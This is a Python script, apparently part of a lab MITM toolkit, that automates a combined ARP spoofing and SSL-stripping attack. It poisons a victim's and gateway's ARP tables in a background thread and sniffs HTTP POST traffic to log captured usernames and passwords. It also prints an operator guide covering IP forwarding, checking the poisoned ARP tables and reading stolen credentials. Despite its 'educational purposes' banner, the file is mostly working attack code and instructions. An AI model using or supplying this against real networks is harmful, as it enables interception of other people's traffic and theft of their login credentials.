#!/usr/bin/env python3
"""
Combined ARP Spoofing + SSL Strip Testing Script
WARNING: Only run in controlled lab environment with permission!

This script demonstrates the complete MITM attack flow:
1. ARP spoofing to position as man-in-the-middle
2. SSL stripping to downgrade HTTPS to HTTP
3. Credential capture from HTTP traffic
"""

import sys
import time
import threading
from mitmtool.arp import get_mac, spoof
from mitmtool.sslstrip import SSLStripper

def print_banner():
    """Print test banner"""
    print("="*70)
    print(" ARP SPOOFING + SSL STRIPPING TEST")
    print(" Educational purposes only!")
    print("="*70)
    print()

def test_setup():
    """Guide user through test setup"""
    print("[*] TEST SETUP CHECKLIST")
    print()
    print("1. Network Configuration:")
    print("   - Attacker (you): This machine")
    print("   - Victim: Another device on same network")
    print("   - Gateway: Router/default gateway")
    print()
    print("2. Prerequisites:")
    print("   ✓ All machines on same network (NAT or Host-only)")
    print("   ✓ You have victim's IP address")
    print("   ✓ You have gateway's IP address")
    print("   ✓ Running as Administrator/root")
    print()
    print("3. IP Forwarding (REQUIRED):")
    print("   Windows: Set-NetIPInterface -Forwarding Enabled")
    print("   Linux:   echo 1 > /proc/sys/net/ipv4/ip_forward")
    print()
    print("4. Test Website on Victim:")
    print("   - Browse to http://testphp.vulnweb.com")
    print("   - Or any HTTP site with login form")
    print()
    input("Press Enter when ready to start...")
    print()

def arp_spoof_worker(target_ip, gateway_ip, target_mac, gateway_mac, running):
    """Background worker for ARP spoofing"""
    sent_packets = 0
    while running['active']:
        try:
            # Tell target: "I am the gateway"
            spoof(target_ip, gateway_ip, target_mac)
            
            # Tell gateway: "I am the target"
            spoof(gateway_ip, target_ip, gateway_mac)
            
            sent_packets += 2
            if sent_packets % 10 == 0:  # Update every 10 packets
                print(f"\r[ARP] Packets sent: {sent_packets}", end="")
                sys.stdout.flush()
            
            time.sleep(2)
        except Exception as e:
            print(f"\n[ARP ERROR] {e}")
            break

def test_combined_attack():
    """Test ARP spoofing combined with SSL stripping"""
    print_banner()
    
    # CONFIGURATION - CHANGE THESE FOR YOUR NETWORK
    target_ip = "10.0.0.40"     # Victim device IP
    gateway_ip = "10.0.0.1"      # Router/Gateway IP
    interface = "Ethernet"        # Network interface to sniff on
    
    print(f"[*] Target (Victim): {target_ip}")
    print(f"[*] Gateway (Router): {gateway_ip}")
    print(f"[*] Interface: {interface}")
    print()
    
    # Step 1: Get MAC addresses
    print("[STEP 1] Discovering MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        print(f"[-] ERROR: Could not find MAC for target {target_ip}")
        print("[!] Make sure the IP is correct and device is online")
        return
    
    if not gateway_mac:
        print(f"[-] ERROR: Could not find MAC for gateway {gateway_ip}")
        return
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print()
    
    # Step 2: Setup SSL stripper
    print("[STEP 2] Initializing SSL Stripper...")
    stripper = SSLStripper(log_file="sslstrip_test.log")
    print("[+] SSL Stripper ready")
    print("[+] Logs will be written to: sslstrip_test.log")
    print()
    
    # Step 3: Start ARP spoofing in background
    print("[STEP 3] Starting ARP spoofing...")
    running = {'active': True}
    arp_thread = threading.Thread(
        target=arp_spoof_worker,
        args=(target_ip, gateway_ip, target_mac, gateway_mac, running)
    )
    arp_thread.daemon = True
    arp_thread.start()
    time.sleep(2)  # Let ARP spoofing start
    print("\n[+] ARP spoofing active")
    print()
    
    # Step 4: Start SSL stripping (packet sniffing)
    print("[STEP 4] Starting SSL strip - monitoring HTTP traffic...")
    print("[*] Listening for HTTP requests from victim...")
    print()
    print("="*70)
    print(" ATTACK ACTIVE - WHAT TO DO NOW:")
    print("="*70)
    print()
    print("1. On victim machine, open a web browser")
    print("2. Visit an HTTP website (not HTTPS!)")
    print("   Try: http://testphp.vulnweb.com")
    print("   Or:  http://neverssl.com")
    print()
    print("3. Try to login with test credentials:")
    print("   Username: test")
    print("   Password: test123")
    print()
    print("4. Watch this window for captured data")
    print()
    print("5. Press Ctrl+C to stop the attack")
    print("="*70)
    print()
    
    try:
        # Start sniffing HTTP traffic
        stripper.sniff_credentials(interface=interface, target_ip=target_ip)
        
    except KeyboardInterrupt:
        print("\n\n[*] Stopping attack...")
        running['active'] = False
        
        # Restore ARP tables
        print("[*] Restoring ARP tables...")
        for _ in range(5):
            spoof(target_ip, gateway_ip, gateway_mac)
            spoof(gateway_ip, target_ip, target_mac)
            time.sleep(0.5)
        
        print("[+] ARP tables restored")
        print("[+] Attack stopped safely")
        print()
        print("[*] Check 'sslstrip_test.log' for captured credentials")

def test_manual_steps():
    """Provide manual testing instructions"""
    print_banner()
    
    print("[*] MANUAL TESTING GUIDE")
    print()
    print("This guide walks you through testing ARP + SSL strip manually.")
    print()
    
    print("=" * 70)
    print(" PHASE 1: ARP SPOOFING")
    print("=" * 70)
    print()
    print("Terminal 1 (ARP Spoofing):")
    print("-" * 70)
    print("python test_arp.py")
    print()
    print("What to expect:")
    print("  ✓ Discovers MAC addresses of target and gateway")
    print("  ✓ Sends ARP packets every 2 seconds")
    print("  ✓ Victim's traffic now flows through your machine")
    print()
    print("Verify:")
    print("  - On victim: arp -a (Windows) or ip neigh (Linux)")
    print("  - Gateway's MAC should now show YOUR MAC address")
    print()
    
    print("=" * 70)
    print(" PHASE 2: ENABLE IP FORWARDING")
    print("=" * 70)
    print()
    print("⚠️  CRITICAL: Without this, victim loses internet!")
    print()
    print("Windows (Admin PowerShell):")
    print("-" * 70)
    print("Set-NetIPInterface -Forwarding Enabled")
    print()
    print("Linux:")
    print("-" * 70)
    print("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print()
    print("Verify:")
    print("  - Victim can still browse internet")
    print("  - Traffic flows through your machine")
    print()
    
    print("=" * 70)
    print(" PHASE 3: SSL STRIPPING")
    print("=" * 70)
    print()
    print("Terminal 2 (SSL Strip - while ARP spoofing runs):")
    print("-" * 70)
    print('python mitmtool/sslstrip.py --mode sniff --interface "Ethernet"')
    print()
    print("What it does:")
    print("  ✓ Monitors HTTP traffic from victim")
    print("  ✓ Looks for credentials in POST requests")
    print("  ✓ Logs captured data to sslstrip.log")
    print()
    
    print("=" * 70)
    print(" PHASE 4: CAPTURE CREDENTIALS")
    print("=" * 70)
    print()
    print("On victim machine:")
    print("-" * 70)
    print("1. Open browser")
    print("2. Visit HTTP website (important: NOT https!)")
    print("   - http://testphp.vulnweb.com")
    print("   - http://neverssl.com")
    print()
    print("3. Try to login:")
    print("   Username: test")
    print("   Password: test123")
    print()
    print("4. Check attacker's terminal for captured data")
    print()
    
    print("=" * 70)
    print(" WHAT YOU SHOULD SEE")
    print("=" * 70)
    print()
    print("In attacker's SSL strip terminal:")
    print("-" * 70)
    print("[CREDENTIALS CAPTURED]")
    print("POST /login HTTP/1.1")
    print("Host: testphp.vulnweb.com")
    print("username=test&password=test123")
    print()
    print("In sslstrip.log file:")
    print("-" * 70)
    print("[12:34:56] POST Request to testphp.vulnweb.com")
    print("[12:34:56] username=test&password=test123")
    print()
    
    print("=" * 70)
    print(" CLEANUP")
    print("=" * 70)
    print()
    print("1. Press Ctrl+C on ARP spoofing script")
    print("   - Automatically restores ARP tables")
    print()
    print("2. Press Ctrl+C on SSL strip script")
    print()
    print("3. Disable IP forwarding:")
    print("   Windows: Set-NetIPInterface -Forwarding Disabled")
    print("   Linux:   echo 0 > /proc/sys/net/ipv4/ip_forward")
    print()
    
    print("=" * 70)
    print(" WHY HTTPS SITES DON'T WORK")
    print("=" * 70)
    print()
    print("Protected sites (Google, Facebook, banks):")
    print("  ✗ Have HSTS (forced HTTPS)")
    print("  ✗ Browser won't allow HTTP")
    print("  ✗ Certificate pinning")
    print()
    print("Vulnerable sites:")
    print("  ✓ Pure HTTP sites")
    print("  ✓ Sites without HSTS")
    print("  ✓ First-time visits")
    print()

def main():
    """Main menu"""
    while True:
        print()
        print("=" * 70)
        print(" ARP + SSL STRIP TESTING MENU")
        print("=" * 70)
        print()
        print("1. Test Setup Checklist")
        print("2. Run Combined Attack (Automated)")
        print("3. Manual Testing Guide (Step-by-step)")
        print("4. Exit")
        print()
        
        choice = input("Select option [1-4]: ").strip()
        
        if choice == "1":
            test_setup()
        elif choice == "2":
            test_combined_attack()
        elif choice == "3":
            test_manual_steps()
        elif choice == "4":
            print("\n[*] Exiting...")
            break
        else:
            print("\n[-] Invalid option")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
        sys.exit(0)
